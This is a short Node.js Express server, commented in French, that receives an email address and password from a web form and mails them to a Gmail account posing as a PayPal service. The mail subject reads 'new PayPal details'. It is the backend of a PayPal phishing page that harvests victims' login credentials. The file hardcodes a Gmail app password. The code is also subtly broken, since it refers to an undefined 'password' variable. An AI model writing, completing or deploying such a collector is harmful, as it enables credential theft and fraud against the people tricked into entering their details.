const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Configurer Nodemailer avec Gmail (SMTP)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'services.inli.paypal@gmail.com', // Remplace par ton email
    pass: 'sucx eqsl dcsb oafb', // 🔴 Mot de passe d'application (pas ton mot de passe Gmail normal !)
  },
});

// Route pour envoyer un email
app.post('/send-email', async (req, res) => {
  const { email, message } = req.body;

  const mailOptions = {
    from: 'services.inli.paypal@gmail.com',
    to: 'services.inli.paypal@gmail.com', // Email où tu veux recevoir les messages
    subject: `Nouvel coordonnée payapl`,
    text: `Email: ${email}\nMots de passe: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Email envoyé !');
  } catch (error) {
    console.error(error);
    res.status(500).send('Erreur lors de l’envoi');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
